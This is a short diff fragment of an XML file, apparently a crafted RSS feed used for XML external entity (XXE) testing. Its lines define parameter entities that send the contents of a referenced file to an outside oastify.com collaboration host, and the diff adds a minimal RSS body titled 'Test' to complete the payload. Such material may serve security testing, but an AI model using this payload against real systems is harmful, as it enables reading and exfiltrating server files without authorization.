@@ -2,3 +2,10 @@
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://vji5j8zjebmpkcida8lk712nhen5bxzm.oastify.com/?data=%file;'>">
 %eval;
 %exfil;
+]>
+<rss version="2.0">
+  <channel>
+    <title>Test</title>
+    <description>Test</description>
+  </channel>
+</rss>
